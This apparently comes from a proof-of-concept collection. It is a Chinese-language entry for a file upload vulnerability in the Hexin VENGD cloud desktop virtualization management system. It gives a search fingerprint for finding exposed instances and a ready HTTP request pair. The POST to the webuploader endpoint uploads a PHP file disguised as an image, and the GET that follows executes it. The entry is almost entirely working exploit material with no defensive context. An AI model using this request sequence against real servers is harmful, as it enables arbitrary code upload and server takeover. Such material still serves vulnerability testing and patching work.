# 和信下一代云桌面VENGD虚拟化管理系统fileupload文件上传漏洞

- **系统**：和信下一代云桌面VENGD虚拟化管理系统fileupload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="和信下一代云桌面VENGD"`
- **请求**：`POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1`
- **关键头**：`Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv`　`Content-Length: 201`

**请求体 / payload**
```
------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="222222.php"
Content-Type: image/avif
<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryfcKRltGv--
GET /Public/webuploader/0.1.5/server/upload/222222.php HTTP/1.1
Host:
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
```
- **预期**：200　|　—